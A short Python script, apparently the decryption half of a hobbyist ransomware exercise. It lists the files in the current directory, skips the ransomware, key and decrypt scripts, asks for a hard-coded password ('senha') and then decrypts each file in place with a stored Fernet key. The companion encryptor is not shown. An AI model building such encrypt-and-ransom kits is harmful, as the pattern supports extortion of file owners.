#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransonware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secret_key = key.read()

passphrase = "senha"
upassoword = input("Enter the password to decrypt your files: ")

if upassoword == passphrase:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()

        content_decrypt = Fernet(secret_key).decrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)

    print("You recovered all you files")
else:
    print("Enter the right password to recovery you files!")
